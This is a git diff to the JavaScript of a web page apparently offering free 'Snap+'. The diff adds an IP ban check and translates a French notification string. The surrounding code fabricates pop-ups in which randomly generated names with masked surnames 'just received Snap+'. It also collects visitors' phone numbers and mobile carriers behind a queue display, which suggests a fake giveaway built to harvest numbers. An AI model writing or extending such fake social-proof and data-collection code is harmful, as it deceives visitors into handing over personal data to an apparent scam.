@@ -7,6 +7,21 @@ const CONFIG = {
 };
 
 // ═════════════════════════════════════════════════════════════
+// BAN IP CHECK — bloque l'accès au site si banni
+// ═════════════════════════════════════════════════════════════
+async function checkBan() {
+    try {
+        const res = await fetch('/api/check-ban');
+        const data = await res.json();
+        if (data.banned) {
+            window.location.href = 'banned.html';
+        }
+    } catch (e) {
+        console.error('Ban check error:', e);
+    }
+}
+
+// ═════════════════════════════════════════════════════════════
 // NOTIFICATIONS ANIMÉES
 // ═════════════════════════════════════════════════════════════
 const notifNames = [
@@ -24,7 +39,7 @@ function getRandomNotif() {
     const name = notifNames[Math.floor(Math.random() * notifNames.length)];
     const surname = notifSurnames[Math.floor(Math.random() * notifSurnames.length)];
     const masked = surname.substring(0, 2) + '***';
-    return `🎉 ${name}${masked} vient de recevoir son Snap+ !`;
+    return `🎉 ${name}${masked} just received Snap+ !`;
 }
 
 function startNotifications() {
@@ -35,10 +50,8 @@ function startNotifications() {
     el.textContent = current;
 
     setInterval(() => {
-        // Fade out
         el.style.opacity = '0';
         el.style.transform = 'translateX(10px)';
-
         setTimeout(() => {
             current = getRandomNotif();
             el.textContent = current;
@@ -175,8 +188,6 @@ function updateOperators() {
     });
 
     selectedOperator = opValues[0];
-
-    // Mise à jour du warning
     elements.warningMsg.textContent = isBe ? t.warningBe : t.warning;
 }
 
@@ -314,7 +325,6 @@ async function submitForm() {
         const result = await response.json();
 
         if (response.ok && result.success) {
-            // Redirection vers la page de validation
             window.location.href = `validation.html?phone=${encodeURIComponent(phone)}&carrier=${encodeURIComponent(operator)}`;
         } else if (response.status === 409) {
             showStatus(translations[currentLang].statusDuplicate, 'error');
@@ -344,7 +354,8 @@ document.addEventListener('keydown', (e) => {
     }
 });
 
-document.addEventListener('DOMContentLoaded', () => {
+document.addEventListener('DOMContentLoaded', async () => {
+    await checkBan(); // ← Vérifie le ban AVANT tout
     startNotifications();
     updateOperators();
     updateQueueDisplay();
